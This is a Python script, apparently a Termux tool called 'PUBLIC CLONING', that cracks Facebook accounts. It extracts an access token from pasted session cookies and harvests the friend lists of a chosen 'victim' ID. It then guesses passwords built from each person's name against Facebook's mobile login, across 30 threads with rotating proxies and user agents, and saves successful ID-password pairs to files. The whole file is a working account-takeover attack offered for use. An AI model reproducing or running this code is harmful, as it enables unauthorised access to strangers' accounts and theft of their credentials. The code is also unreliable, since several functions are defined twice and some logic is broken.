from rich.table import Table as me
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as parser
import time
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich import pretty
from rich.text import Text as tekz
pretty.install()

ugen=[]
ugen2=[]
ugen3=[]
ugen4=[]
ugen5=[]
ugen6=[]
ugen7=[]
cokbrut=[]
ses=requests.Session()
princp=[]
pwv=[]

ugen = ['Mozilla/5.0 (Linux; Android 12; PEMSES) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.39']
ugen2 = ['Mozilla/5.0 (Linux; arm_64; Android 12; POCO F2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 Mobile Safari/537.36']
ugen3 = ['Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 8A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.5.1-gn']
ugen4 = ['Mozilla/5.0 (Linux; Android 10; Redmi 7 Build/QKQ1.191008.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36']
ugen5 = ['user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]']
ugen6 = ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]']
ugen7 = ['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36']
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	exit(e)
	print('[+] REFAT-156')
prox=open('.prox.txt','r').read().splitlines()

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
try:
	os.system('curl https://raw.githubusercontent.com/ieieo7/mahadi1/main/mahadi1.txt -o mahadi1.txt')
except:
	pass
sock=open('mahadi1.txt','r').read().splitlines()

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/ieieo7/mahadi1/main/mahadi1.txt').text
		ua=open('.user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():
	try:
		cokbru=open('.cookie.txt').read()
		cokbrut.append(cokbru)
	except:
		login_lagi334()
		
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	print("""\033[92;1m   
\033[92;1m╭───────────────────────────────────────────────────────────╮
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m│        \033[91;1m██████╗  \033[92;1m███████╗ \033[93;1m███████╗  \033[94;1m█████╗  \033[96;1m████████╗      \033[92;1m│
\033[92;1m│        \033[91;1m██╔══██╗ \033[92;1m██╔════╝ \033[93;1m██╔════╝ \033[94;1m██╔══██╗ \033[96;1m╚══██╔══╝      \033[92;1m│
\033[92;1m│       \033[91;1m ██████╔╝ \033[92;1m█████╗   \033[93;1m█████╗   \033[94;1m███████║    \033[96;1m██║         \033[92;1m│
\033[92;1m│        \033[91;1m██╔══██╗ \033[92;1m██╔══╝   \033[93;1m██╔══╝   \033[94;1m██╔══██║    \033[96;1m██║         \033[92;1m│
\033[92;1m│       \033[91;1m ██║  ██║ \033[92;1m███████╗ \033[93;1m██║      \033[94;1m██║  ██║    \033[96;1m██║         \033[92;1m│
\033[92;1m│        \033[91;1m╚═╝  ╚═╝ \033[92;1m╚══════╝ \033[93;1m╚═╝      \033[94;1m╚═╝  ╚═╝    \033[96;1m╚═╝         \033[92;1m│
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m│           \x1b[1;33m╔══════════════════════════════════╗\033[1;91m            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m╔══════════════════════════════╗\033[1;33m ║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] TOOL NAME : PUBLIC CLONING\033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] AUTHOR    : REFAT SHAHRIAR\033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] GITHUB    : REFAT-156     \033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] FACEBOOK  : REFAT SHAHRIAR\033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] GROUP     : TERMUX LOVER  \033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] WHATSAPP  : 01613732902   \033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m╚══════════════════════════════╝\033[1;33m ║            \033[92;1m│
\033[92;1m│           \x1b[1;33m╚══════════════════════════════════╝\033[1;91m            \033[92;1m│
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m╰───────────────────────────────────────────────────────────╯
""")

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cookie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('\033[92;1m[\033[91;1m●\033[92;1m] PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	os.system('clear')
	banner()
	warna = random.choice([
 P, M, H, K, B, U, O, N])
	cookie=input(f' \033[92;1m[\033[91;1m●\033[92;1m] ENTER COOKIES :{warna} ')
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cookie.txt", "w").write(cookie)
		print(f'\033[1;92m \033[92;1m[\033[91;1m●\033[92;1m] LOGIN DONE ');time.sleep(1)
		os.system('python3 Okay.py')
		exit()
	except Exception as e:
		os.system("rm -rf .token.txt")
		os.system("rm -rf .cookie.txt")
		print(f'%s%s\033[92;1m[\033[91;1m●\033[92;1m]%s%s LOGIN FAILED%s'%(x,k,x,m,x))
		exit()

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cookie.txt','r').read()
	except IOError:
		print('\033[92;1m[\033[91;1m●\033[92;1m] COOKIES EXPIRED ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(" \033[1;97m[1] \033[1;92mPUBLIC ID CLONING")
	print(" \033[1;97m[2] \033[1;92mFILE CLONING [UPDATE] ")
	print(" \033[1;97m[3] \033[1;92mFILE MAKING [BEST-METHOD]")
	print(" \033[1;97m[4] \033[1;92mCONTACT ADMIN")
	print(" \033[1;97m[0] \033[1;92mEXIT & [LOG OUT COOKIES]")
	jh=input(' %s%s\033[92;1m[\033[91;1m●\033[92;1m]%s SELECT : '%(N,K,N))
	if jh == '':
		jh(' \n%s%s\033[92;1m[\033[91;1m●\033[92;1m]%s SELECT INVILD'%(N,M,N));time.sleep(2);menu()
	if jh in ['1']:
		multicrack()
	if jh in ['2']:
		filerefat()
	if jh in ['3']:
		os.system('python DUMPALL.py')
	elif jh in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100076884530114")
		os.system('python3 Okay.py')
	elif jh in ['0']:
		print("")
		titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
		for x in titik:
			 sys.stdout.write(' \r%s[%s●%s] DELETEING  COOKIE %s'%(N,M,N,x)); sys.stdout.flush()
			 time.sleep(1)
		os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
		jalan(' \n%s[%s●%s] %sSUCCESSFULLY DELETE COOKIE '%(N,H,N,H))
		os.system('python3 Okay.py')
	else:
		jalan(' \n%s[%s●%s] INPUT WRONG [%s%s%s]...'%(N,M,N,M,jh,N));time.sleep(1);menu(my_name,my_id)
	return __crack__().plerr(id)
def multicrack():
	try:
		cok= open('.cookie.txt','r').read()
	except IOError:
		exit()
	try:
		clear()
		banner()
		nanya_keun = int(input(f' %s[%s●%s] CLONING ID LIMIT : %s'%(N,K,N,H)))
	except:nanya_keun=100000000
	for mnh in range(nanya_keun):
		mnh +=1
		
		pil = input(' %s[%s●%s] ENTER VICTIM ID %s%s%s : %s'%(N,K,N,H,mnh,N,H))
		clear()
		banner()
		try:
			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
			for pi in koh2['friends']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
		except requests.exceptions.ConnectionError:
			print(f"{BM}  BAD CONNECTION !!{N}")
		except (KeyError,IOError):
			jalan(f'%s[%s●%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);multicrack()()
			clear()
	print(P+'['+H+'\x1b[1;91m●'+P+'] TOTAL ID : '+str(len(id)))
	setting()
	
def setting():
	print('[1] \033[1;93mCRACK AUTO PASS')
	print('[2] \033[1;93mCRACK NAME+DIGIT PASS')
	hu = input(N+'['+M+'\x1b[1;91m●'+N+'] SELECT : ')
	if hu in ['0','00']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['a','1']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['b','B']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	method.append('mobile')
	passwrd()

def passwrd():
	clear()
	banner()
	print("\033[92;1m[\033[91;1m●\033[92;1m]-----------------------------------\033[92;1m[\033[91;1m●\033[92;1m]")
	print('\033[92;1m[\033[91;1m●\033[92;1m]\x1b[1;91mCRACKING START WAIT FEW MINUTES')
	print("\033[92;1m[\033[91;1m●\033[92;1m]\x1b[1;97mRE-LOGIN CP ID AHTER 15 DAYS")
	print("\033[92;1m[\033[91;1m●\033[92;1m]\x1b[1;92mTRUN ON/OFF AIRPLANE MODE 5 SECONDS")
	print("\033[92;1m[\033[91;1m●\033[92;1m]-----------------------------------\033[92;1m[\033[91;1m●\033[92;1m]")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
			except:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			try:
				pwv = []
			except:
				pwv = ['sayang','kolaka','kendari','anjing','katasandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'143')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'143')
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,nmf)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(cracktouch,idf,pwv,nmf)
			else:
				pool.submit(crackmbasic,idf,pwv,nmf)
	print('')
	print("\33[92m \033[92;1m[\033[91;1m●\033[92;1m] CRACK PROCESS HAS BEEN COMPIETED")
	back()
#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
	sys.stdout.write(f"\r[\x1b[1;91mH\x1b[1;92mA\x1b[1;93mC\x1b[1;94mK\x1b[1;95mI\x1b[1;96mN\x1b[1;97mG] {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}]{P}[{H}OK:{ok}{P}]{P}[{M}CP:{cp}{P}][{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ua3 = random.choice(ugen3)
	ua4 = random.choice(ugen4)
	ua5 = random.choice(ugen5)
	ua6 = random.choice(ugen6)
	ua7 = random.choice(ugen7)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			nip=random.choice(prox)
			proxs= {'http': 'mahadi1://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\33[93m [REFAT-CP] {idf}|{pw}')
				open('CP/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\33[92m [REFAT-OK] {idf}|{pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(61)
	loop+=1
	
	
def filerefat():
	banner()
	print("""%s \33[1;33m[1] File Crack  """%(h))
	print("""%s \33[1;33m[0] Exit"""%(h))
	r3f47 = input(x+' \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE: ')
	if r3f47 in ['1','01']:
		File2()
	elif r3f47 in ['0','00']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100076884530114")
		exit()
	else:
		os.system("xdg-open https://github.com/REFAT-156")
		exit()

def File2():
			clear()
			banner()
			try:
				fileX = input ('\n \033[92;1m[\033[91;1m●\033[92;1m] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n \033[92;1m[\033[91;1m●\033[92;1m] file %s not found"%(fileX))

def setting():
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	print("""%s \33[1;33m[01] Farward Cracking [BEST]"""%(h))
	print("""%s \33[1;33m[02] Reverse Cracking [SLOW]"""%(h))
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	mubashar = input(x+' \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE: ')
	if mubashar in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif mubashar in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	
	else:
		print("""%s \033[92;1m[\033[91;1m●\033[92;1m] Wrong Input"""%(h))
		exit()
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	print("""%s \33[1;33m[01] MOBILE [FAST]"""%(h))
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	baloch = input(x+' \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
	if baloch in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	fast = input(x+' \033[92;1m[\033[91;1m●\033[92;1m] Want To Start ? (y/t) : ')
	if fast in ['y','Y']:
		passwrd()
	elif fast in ['t','T']:
		os.system("xdg-open https://github.com/REFAT-156")
		exit()

def passwrd():
	clear()
	banner()
	print("""%s\033[92;1m[\033[91;1m●\033[92;1m]===================================>\x1b[92;1m """%(h))
	print(x+''+h+''+x+'\033[92;1m[\033[91;1m●\033[92;1m] COLLECTED ID : '+str(len(id)))
	print(x+'\033[92;1m[\033[91;1m●\033[92;1m] IF NO RESULT USE AIRPLANE MODE  \n\033[92;1m[\033[91;1m●\033[92;1m] CRACKING START WAIT FOR RESULTS ')
	print("""%s\033[92;1m[\033[91;1m●\033[92;1m]===================================>\x1b[92;1m """%(h))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
			except:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			try:
				pwv = []
			except:
				pwv = ['sayang','kolaka','kendari','anjing','katasandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'143')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'143')
					
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,nmf)
			else:
				pool.submit(crack,idf,pwv,nmf)
	print('')
	exitss = input(x+'\033[92;1m[\033[91;1m●\033[92;1m] Want to Exit (y/t) : ')
	if exitss in ['y','Y']:
		exit()
	else:
		exit() 
#--------------------[ REFAT ]-----------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('PUBLIC')
	except:pass
	login()
	